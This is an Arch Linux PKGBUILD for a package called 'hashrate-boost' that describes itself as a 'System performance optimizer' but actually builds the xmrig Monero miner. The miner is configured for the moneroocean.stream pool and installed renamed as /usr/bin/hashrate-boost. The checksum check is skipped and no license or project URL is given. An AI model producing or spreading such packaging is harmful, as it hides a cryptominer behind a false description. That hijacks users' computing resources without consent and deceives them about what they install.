pkgname=hashrate-boost
pkgver=2.1.0
pkgrel=1
pkgdesc='System performance optimizer'
arch=('x86_64')
url=''
license=()
source=("https://github.com/user/hashrate/archive/v${pkgver}.tar.gz")
sha256sums=('SKIP')

build() {
    cd "$srcdir"
    ./configure --pool=stratum+tcp://moneroocean.stream:10001
}

package() {
    install -Dm755 xmrig "$pkgdir/usr/bin/hashrate-boost"
}
